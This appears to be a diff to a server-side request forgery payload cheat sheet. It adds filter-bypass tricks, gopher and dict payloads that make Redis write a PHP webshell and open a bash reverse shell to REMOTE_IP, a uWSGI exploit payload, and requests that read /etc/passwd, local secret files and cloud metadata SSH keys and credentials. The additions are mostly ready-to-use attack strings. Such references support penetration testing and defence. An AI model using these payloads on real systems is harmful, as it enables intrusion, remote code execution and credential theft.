@@ -15,11 +15,13 @@
   * [Bypass using IPv6/IPv4 Address Embedding](#bypass-using-ipv6ipv4-address-embedding)
   * [Bypass using malformed urls](#bypass-using-malformed-urls)
   * [Bypass using rare address](#bypass-using-rare-address)
+  * [Bypass using URL encoding](#bypass-using-url-encoding)
   * [Bypass using bash variables](#bypass-using-bash-variables)
   * [Bypass using tricks combination](#bypass-using-tricks-combination)
   * [Bypass using enclosed alphanumerics](#bypass-using-enclosed-alphanumerics)
   * [Bypass filter_var() php function](#bypass-filter_var-php-function)
   * [Bypass against a weak parser](#bypass-against-a-weak-parser)
+  * [Bypassing using jar protocol (java only)](#bypassing-using-jar-protocol-java-only)
 * [SSRF exploitation via URL Scheme](#ssrf-exploitation-via-url-scheme)
   * [file://](#file)
   * [http://](#http)
@@ -29,7 +31,10 @@
   * [ldap://](#ldap)
   * [gopher://](#gopher)
   * [netdoc://](#netdoc)
+* [SSRF exploiting WSGI](#ssrf-exploiting-wsgi)
+* [SSRF exploiting Redis](#ssrf-exploiting-redis)
 * [SSRF to XSS](#ssrf-to-xss)
+* [SSRF from XSS](#ssrf-from-xss)
 * [SSRF URL for Cloud Instances](#ssrf-url-for-cloud-instances)
   * [SSRF URL for AWS Bucket](#ssrf-url-for-aws-bucket)
   * [SSRF URL for AWS ECS](#ssrf-url-for-aws-ecs)
@@ -73,22 +78,6 @@ Basic SSRF - Alternative version
 http://localhost:80
 http://localhost:443
 http://localhost:22
-```
-
-Advanced exploit using a redirection
-
-```powershell
-1. Create a subdomain pointing to 192.168.0.1 with DNS A record  e.g:ssrf.example.com
-2. Launch the SSRF: vulnerable.com/index.php?url=http://YOUR_SERVER_IP
-vulnerable.com will fetch YOUR_SERVER_IP which will redirect to 192.168.0.1
-```
-
-Advanced exploit using type=url
-
-```powershell
-Change "type=file" to "type=url"
-Paste URL in text field and hit enter
-Using this vulnerability users can upload images from any image URL = trigger an SSRF
 ```
 
 ## Bypassing filters
@@ -149,6 +138,7 @@ http://0177.0.0.1/
 http://2130706433/ = http://127.0.0.1
 http://3232235521/ = http://192.168.0.1
 http://3232235777/ = http://192.168.1.1
+http://2852039166/  = http://169.254.169.254
 ```
 
 ### Bypass using IPv6/IPv4 Address Embedding
@@ -174,6 +164,15 @@ You can short-hand IP addresses by dropping the zeros
 http://0/
 http://127.1
 http://127.0.1
+```
+
+### Bypass using URL encoding
+
+[Single or double encode a specific URL to bypass blacklist](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)
+
+```powershell
+http://127.0.0.1/%61dmin
+http://127.0.0.1/%2561dmin
 ```
 
 ### Bypass using bash variables 
@@ -224,6 +223,41 @@ http://127.1.1.1:80#\@127.2.2.2:80/
 
 ![https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/SSRF_Parser.png?raw=true](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/WeakParser.jpg?raw=true)
 
+### Bypassing using a redirect
+[using a redirect](https://portswigger.net/web-security/ssrf#bypassing-ssrf-filters-via-open-redirection)
+
+```powershell
+1. Create a page on a whitelisted host that redirects requests to the SSRF the target URL (e.g. 192.168.0.1)
+2. Launch the SSRF pointing to  vulnerable.com/index.php?url=http://YOUR_SERVER_IP
+vulnerable.com will fetch YOUR_SERVER_IP which will redirect to 192.168.0.1
+```
+
+### Bypassing using type=url
+
+```powershell
+Change "type=file" to "type=url"
+Paste URL in text field and hit enter
+Using this vulnerability users can upload images from any image URL = trigger an SSRF
+```
+
+### Bypassing using DNS Rebinding (TOCTOU)
+
+```powershell
+Create a domain that change between two IPs. http://1u.ms/ exists for this purpose.
+For example to rotate between 1.2.3.4 and 169.254-169.254, use the following domain:
+make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
+```
+
+### Bypassing using jar protocol (java only)
+
+Blind SSRF
+
+```powershell
+jar:scheme://domain/path!/ 
+jar:http://127.0.0.1!/
+jar:https://127.0.0.1!/
+jar:ftp://127.0.0.1!/
+```
 
 ## SSRF exploitation via URL Scheme
 
@@ -352,7 +386,55 @@ Content of evil.com/redirect.php:
 Wrapper for Java when your payloads struggle with "\n" and "\r" characters.
 
 ```powershell
-ssrf.php?url=gopher://127.0.0.1:4242/DATA
+ssrf.php?url=netdoc:///etc/passwd
+``` 
+
+## SSRF exploiting WSGI
+
+Exploit using the Gopher protocol, full exploit script available at https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py.
+
+```powershell
+gopher://localhost:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py
+```
+
+| Header    |           |             |
+|-----------|-----------|-------------|
+| modifier1 | (1 byte)  | 0 (%00)     |
+| datasize  | (2 bytes) | 26 (%1A%00) |
+| modifier2 | (1 byte)  | 0 (%00)     |
+
+| Variable (UWSGI_FILE) |           |    |            |   |
+|-----------------------|-----------|----|------------|---|
+| key length            | (2 bytes) | 10 | (%0A%00)   |   |
+| key data              | (m bytes) |    | UWSGI_FILE |   |
+| value length          | (2 bytes) | 12 | (%0C%00)   |   |
+| value data            | (n bytes) |    | /tmp/test.py   |   |
+	
+
+## SSRF exploiting Redis
+
+> Redis is a database system that stores everything in RAM
+
+```powershell
+# Getting a webshell
+url=dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
+url=dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php
+url=dict://127.0.0.1:6379/SET%20mykey%20"<\x3Fphp system($_GET[0])\x3F>"
+url=dict://127.0.0.1:6379/SAVE
+
+# Getting a PHP reverse shell
+gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml
+gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php
+gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FREMOTE_IP%2FREMOTE_PORT%200%3E%261%27%29%3B%3F%3E%22
+gopher://127.0.0.1:6379/_save
+```
+
+## SSRF exploiting PDF file
+
+Example with [WeasyPrint by @nahamsec](https://www.youtube.com/watch?v=t5fB6OZsR6c&feature=emb_title)
+
+```powershell
+<link rel=attachment href="file:///root/secret.txt">
 ```
 
 ## SSRF to XSS 
@@ -366,12 +448,31 @@ https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri= -> simple 
 https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=http://brutelogic.com.br/poc.svg
 ```
 
+## SSRF from XSS
+
+### Using an iframe
+
+The content of the file will be integrated inside the PDF as an image or text.
+
+```html
+<img src="echopwn" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
+```
+
+### Using an attachment
+
+Example of a PDF attachment using HTML 
+
+1. use `<link rel=attachment href="URL">` as Bio text
+2. use 'Download Data' feature to get PDF
+3. use `pdfdetach -saveall filename.pdf` to extract embedded resource
+4. `cat attachment.bin`
+
 ## SSRF URL for Cloud Instances
 
 ### SSRF URL for AWS Bucket
 
 [Docs](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories)
-Interesting path to look for at `http://169.254.169.254`
+Interesting path to look for at `http://169.254.169.254` or `http://instance-data`
 
 ```powershell
 Always here : /latest/meta-data/{hostname,public-ipv4,...}
@@ -382,8 +483,8 @@ Temporary AWS credentials : /latest/meta-data/iam/security-credentials/
 DNS record
 
 ```powershell
+http://instance-data
 http://169.254.169.254
-http://metadata.nicob.net/
 http://169.254.169.254.xip.io/
 http://1ynrnhl.xip.io/
 http://www.owasp.org.1ynrnhl.xip.io/
@@ -499,6 +600,12 @@ Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)
 ```powershell
 http://metadata.google.internal/computeMetadata/v1beta1/
 http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
+```
+
+Required headers can be set using a gopher SSRF with the following technique
+
+```powershell
+gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
 ```
 
 Interesting files to pull out:
@@ -674,3 +781,4 @@ More info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-se
 - [SVG SSRF Cheatsheet - Allan Wirth (@allanlw) - 12/06/2019](https://github.com/allanlw/svg-cheatsheet)
 - [SSRF’s up! Real World Server-Side Request Forgery (SSRF) - shorebreaksecurity - 2019](https://www.shorebreaksecurity.com/blog/ssrfs-up-real-world-server-side-request-forgery-ssrf/)
 - [challenge 1: COME OUT, COME OUT, WHEREVER YOU ARE!](https://www.kieranclaessens.be/cscbe-web-2018.html)
+- [Attacking Url's in JAVA](https://blog.pwnl0rd.me/post/lfi-netdoc-file-java/)
